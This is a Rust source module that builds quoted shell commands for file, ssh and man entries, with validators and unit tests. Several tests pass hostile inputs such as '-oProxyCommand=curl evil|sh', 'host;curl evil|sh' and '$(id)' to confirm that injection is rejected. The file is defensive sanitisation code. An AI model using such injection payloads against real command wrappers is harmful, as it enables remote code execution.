use std::path::{Path, PathBuf};

pub enum Entry {
    Workspace(PathBuf),
    Run {
        cwd: Option<PathBuf>,
        name: String,
        input: String,
    },
}

pub fn file(path: &Path) -> Option<Entry> {
    let resolved = path.canonicalize().ok()?;
    if resolved.is_dir() {
        return Some(Entry::Workspace(resolved));
    }
    let command_path = resolved.to_str()?;
    if command_path.chars().any(|c| c.is_ascii_control()) {
        return None;
    }
    Some(Entry::Run {
        input: quote(command_path),
        name: name_of(&resolved),
        cwd: resolved.parent().map(Path::to_path_buf),
    })
}

pub fn ssh(user: Option<&str>, host: &str, port: Option<u16>) -> Option<Entry> {
    if !is_host(host) {
        return None;
    }
    let mut input = String::from("ssh");
    if let Some(port) = port {
        input.push_str(&format!(" -p {port}"));
    }
    if let Some(user) = user {
        if !is_user(user) {
            return None;
        }
        input.push_str(&format!(" -l {}", quote(user)));
    }
    input.push_str(&format!(" -- {}", quote(host)));
    Some(Entry::Run {
        cwd: None,
        name: host.to_owned(),
        input,
    })
}

pub fn man(section: Option<&str>, page: &str) -> Option<Entry> {
    if !is_page(page) {
        return None;
    }
    let mut input = String::from("man");
    if let Some(section) = section {
        if !is_section(section) {
            return None;
        }
        input.push_str(&format!(" {section}"));
    }
    input.push_str(&format!(" -- {}", quote(page)));
    Some(Entry::Run {
        cwd: None,
        name: page.to_owned(),
        input,
    })
}

pub fn name_of(path: &Path) -> String {
    path.file_name()
        .and_then(|name| name.to_str())
        .unwrap_or("combe")
        .to_owned()
}

fn quote(value: &str) -> String {
    let bare = !value.is_empty()
        && value
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "@%+=:,./-_".contains(c));
    if bare {
        return value.to_owned();
    }
    format!("'{}'", value.replace('\'', r#"'"'"'"#))
}

fn is_host(host: &str) -> bool {
    !host.is_empty()
        && host.len() <= 255
        && !host.starts_with('-')
        && host
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_'))
}

fn is_user(user: &str) -> bool {
    !user.is_empty()
        && user.len() <= 64
        && !user.starts_with('-')
        && user
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_'))
}

fn is_page(page: &str) -> bool {
    !page.is_empty()
        && page.len() <= 128
        && !page.starts_with('-')
        && page
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | '+'))
}

fn is_section(section: &str) -> bool {
    !section.is_empty() && section.len() <= 4 && section.chars().all(|c| c.is_ascii_alphanumeric())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn input_of(entry: Option<Entry>) -> Option<String> {
        match entry? {
            Entry::Run { input, .. } => Some(input),
            Entry::Workspace(_) => None,
        }
    }

    #[test]
    fn ssh_rejects_option_injection() {
        assert!(ssh(None, "-oProxyCommand=curl evil|sh", None).is_none());
        assert!(ssh(Some("-oProxyCommand=x"), "host", None).is_none());
        assert!(ssh(None, "host;curl evil|sh", None).is_none());
        assert!(ssh(None, "$(id)", None).is_none());
        assert!(ssh(None, "", None).is_none());
    }

    #[test]
    fn ssh_separates_options_from_the_host() {
        assert_eq!(
            input_of(ssh(Some("git"), "example.com", Some(2222))).unwrap(),
            "ssh -p 2222 -l git -- example.com"
        );
    }

    #[test]
    fn man_rejects_injection() {
        assert!(man(None, "ls;id").is_none());
        assert!(man(Some("3;id"), "printf").is_none());
        assert!(man(None, "-w").is_none());
    }

    #[test]
    fn quote_neutralizes_shell_metacharacters() {
        assert_eq!(quote("/tmp/plain.command"), "/tmp/plain.command");
        assert_eq!(quote("/tmp/a b;id"), "'/tmp/a b;id'");
        assert_eq!(quote("/tmp/it's"), r#"'/tmp/it'"'"'s'"#);
        assert_eq!(quote("$(id)"), "'$(id)'");
        assert_eq!(quote(""), "''");
    }

    #[test]
    fn file_commands_reject_terminal_controls() {
        let dir = std::env::temp_dir().join(format!("combe-entry-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let plain = dir.join("it's a 文件.command");
        std::fs::write(&plain, "").unwrap();
        assert!(matches!(file(&plain), Some(Entry::Run { .. })));
        assert!(matches!(file(&dir), Some(Entry::Workspace(_))));
        for control in (1u8..=31).chain(std::iter::once(127)) {
            let path = dir.join(format!("a{}.command", char::from(control)));
            std::fs::write(&path, "").unwrap();
            assert!(file(&path).is_none(), "accepted control byte {control}");
        }
        std::fs::remove_dir_all(dir).unwrap();
    }
}
